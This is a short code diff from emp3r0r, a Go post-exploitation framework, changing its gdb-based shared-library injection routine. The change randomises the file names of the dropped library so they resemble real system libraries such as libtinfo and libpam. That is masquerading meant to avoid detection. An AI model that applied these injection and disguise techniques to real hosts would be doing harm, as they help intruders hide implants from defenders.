@@ -13,6 +13,7 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -39,6 +40,7 @@ func gdbInjectSO(path_to_so string, pid int) error {
 	}
 	// cleanup
 	defer func() {
+		time.Sleep(3 * time.Second)
 		err = os.Remove("/tmp/emp3r0r")
 		if err != nil {
 			log.Printf("Delete /tmp/emp3r0r: %v", err)
@@ -225,9 +227,9 @@ func Injector(shellcode *string, pid int) error {
 
 // Inject loader.so into any process
 func GDBInjectSO(pid int) error {
-	so_path := emp3r0r_data.UtilsPath + "/libtinfo.1.2.so"
+	so_path := fmt.Sprintf("%s/libtinfo.so.2.1.%d", emp3r0r_data.UtilsPath, util.RandInt(0, 30))
 	if os.Geteuid() == 0 {
-		root_so_path := "/usr/lib/x86_64-linux-gnu/libpam.so.0.0.1"
+		root_so_path := fmt.Sprintf("/usr/lib/x86_64-linux-gnu/libpam.so.1.%d.1", util.RandInt(0, 20))
 		so_path = root_so_path
 	}
 	if !util.IsFileExist(so_path) {
